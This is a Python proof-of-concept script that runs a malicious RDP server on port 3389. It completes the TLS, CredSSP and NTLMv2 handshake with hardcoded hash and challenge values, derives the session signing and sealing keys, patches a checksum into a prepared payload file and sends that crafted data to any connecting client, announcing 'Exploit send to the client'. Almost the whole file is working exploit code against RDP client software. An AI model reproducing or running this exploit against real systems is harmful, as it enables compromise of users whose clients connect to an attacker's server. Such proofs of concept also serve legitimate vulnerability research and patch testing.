#! /usr/bin/python
import socket
import sys
import binascii
import mmap
import socket, ssl
from Crypto.Cipher import ARC4 #pip install pycryptodome
import hashlib
import hmac

f = open("PoC3", "r+b")
mm = mmap.mmap(f.fileno(), 0)


# Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 3389)
print('PoC3: evil server started on %s port %s' % server_address)
sock.bind(server_address)
sock.listen(1)

while True:
	print('waiting for a connection')
	connection, client_address = sock.accept()

	try:
		print('connection from', client_address)
		data = '';

		# PDU 1
		tmp = connection.recv(45)
		connection.sendall(mm[0:19])

		context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
		context.load_cert_chain(certfile="cert.pem", keyfile="key.pem", password="pass")		
		connstream = context.wrap_socket(connection, server_side=True)

		# PDU 2
		tmp = connstream.recv(93)
		connstream.sendall(mm[19:211])
        
		# PDU 3
		recv = bytearray(connstream.recv(439))
		print('\nPDR received; len = ' + str(len(recv)))
        

		NTLMv2_hash  = bytearray(b'\x11\x79\xDE\xB5\x5A\x6A\xE7\x7D\xF2\xE2\x3A\xFE\xB0\xB1\xFF\x6F')

		ServerChallenge = bytearray(b'\x55\x55\x55\x55\x55\x55\x55\x55')

		TimeStamp = bytearray(b'\x60\x7E\xB3\x4A\xC5\xC0\xCD\x01')

		ClientChallenge = bytearray(recv[199:207])
		print('\nClientChallenge = ' + ClientChallenge.hex())

		TargetInfo = bytearray(b'\x02\x00\x0A\x00\x64\x6F\x6D\x61\x69\x6E\x52\x4F\x43\x4F\x01\x00\x0A\x00\x63\x6F\x6D\x70\x75\x74\x65\x72\x32\x33\x04\x00\x0A\x00\x44\x4E\x53\x74\x68\x65\x6D\x6F\x73\x74\x03\x00\x0A\x00\x74\x68\x65\x6D\x6F\x73\x74\x5F\x32\x33\x07\x00\x08\x00\x60\x7E\xB3\x4A\xC5\xC0\xCD\x01\x06\x00\x04\x00\x02\x00\x00\x00\x0A\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x22\x00\x54\x00\x45\x00\x52\x00\x4D\x00\x53\x00\x52\x00\x56\x00\x2F\x00\x31\x00\x32\x00\x37\x00\x2E\x00\x30\x00\x2E\x00\x30\x00\x2E\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

		ntlm_v2_temp_chal = ServerChallenge + (b'\x01\x01\x00\x00\x00\x00\x00\x00') + TimeStamp + ClientChallenge + (b'\x00\x00\x00\x00') + TargetInfo

		digest = hmac.new(NTLMv2_hash, digestmod='md5')
		digest.update(ntlm_v2_temp_chal)
		NtProofString = digest.digest()

		digest2 = hmac.new(NTLMv2_hash, digestmod='md5')
		digest2.update(NtProofString)
		KeyExchangeKey = SessionBaseKey = digest2.digest()
		print('KeyExchangKey = ' + KeyExchangeKey.hex())

		EncryptedRandomSessionKey = recv[361:377]
		print('EncryptedRandomSessionKey = ' + EncryptedRandomSessionKey.hex())                                           

		cipher = ARC4.new(KeyExchangeKey)
		ExportedSessionKey = RandomSessionKey = cipher.encrypt(EncryptedRandomSessionKey)
		print('RandomSessionKey = ' + RandomSessionKey.hex())

		NTLM_SERVER_SIGN_MAGIC = bytearray(b'session key to server-to-client signing key magic constant\x00')

		m = hashlib.md5()
		m.update(ExportedSessionKey + NTLM_SERVER_SIGN_MAGIC)
		ServerSigningKey = m.digest()
		print('\nServerSigningKey = ' + ServerSigningKey.hex())


		NTLM_SERVER_SEAL_MAGIC = bytearray(b'session key to server-to-client sealing key magic constant\x00')


		m2 = hashlib.md5()
		m2.update(ExportedSessionKey + NTLM_SERVER_SEAL_MAGIC)
		RecvRc4Seal = m2.digest()
		print('RecvRc4Seal = ' + RecvRc4Seal.hex())



        	########### nla_decrypt_public_key_hash #################

		serverClientHash = bytearray(b'\x7F\x27\x1F\x6F\x7B\x22\xAE\x23\xAF\xA3\xBE\x8E\x20\x97\xC2\xE1\x32\x15\x50\x87\xA4\x70\x5B\x68\xA7\x9C\x09\xF5\x45\x56\x30\xB0')

		cipher1 = ARC4.new(RecvRc4Seal)
		data = cipher1.encrypt(serverClientHash)
		mm[239:271] = data
		print('\ndata = ' + data.hex())

		cipher2 = ARC4.new(RecvRc4Seal)
		data_buffer_pvBuffer = cipher2.decrypt(data)
		print('data_buffer_pvBuffer = ' + data_buffer_pvBuffer.hex())


		# HMAC-MD5 hash of ConcatenationOf(seq_num,data)
		SeqNo = bytearray(b'\x00\x00\x00\x00')

		RecvSigningKey = ServerSigningKey

		d = hmac.new(RecvSigningKey, digestmod='md5')
		d.update(SeqNo)
		d.update(data_buffer_pvBuffer)
		digest = d.digest()
		print('Digest = ' + d.hexdigest())
		
		checksum = cipher2.decrypt(bytearray(digest[0:8]))
		print('checksum = ' + checksum.hex())

		#Checksum write
		mm[227:235] = checksum

		hashMagic = bytearray(b'CredSSP Server-To-Client Binding Hash\x00')

		connstream.sendall(mm[211:651])


		# PDU 4
		connstream.sendall(mm[651:1338])

		print('\nExploit send to the client')
		
            
	finally:
		# Clean up the connection
		connection.close()


